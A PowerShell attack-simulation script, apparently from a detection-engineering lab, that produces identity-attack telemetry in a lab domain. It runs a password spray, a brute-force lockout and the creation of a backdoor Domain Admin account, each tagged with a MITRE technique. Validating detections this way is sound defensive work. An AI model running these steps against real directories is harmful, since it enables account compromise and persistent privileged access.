# 07 - Identity attack simulation  ** ISOLATED LAB USE ONLY **
# Generates the telemetry the three detections are built to catch.
Add-Type -AssemblyName System.DirectoryServices.AccountManagement
$ctx = New-Object System.DirectoryServices.AccountManagement.PrincipalContext('Domain', 'lab.local')

# 1) Password spray - one common password tried against every account (MITRE T1110.003)
1..50 | ForEach-Object { $ctx.ValidateCredentials("user$_", "Spring2026!") | Out-Null }

# 2) Brute force - repeated guesses against one account until lockout (MITRE T1110.001)
1..8 | ForEach-Object { $ctx.ValidateCredentials("user7", "WrongPass$_!") | Out-Null }

# 3) Persistence - create a backdoor account and add it to Domain Admins (MITRE T1136.002 / T1098)
$bp = (-join ((65..90) + (97..122) + (48..57) | Get-Random -Count 16 | ForEach-Object { [char]$_ })) + "!9a"
New-ADUser -Name svc_backup -SamAccountName svc_backup -AccountPassword (ConvertTo-SecureString $bp -AsPlainText -Force) -Enabled $true
Add-ADGroupMember "Domain Admins" -Members svc_backup

Get-ADUser user7 -Properties LockedOut | Select-Object Name, LockedOut   # expect LockedOut = True
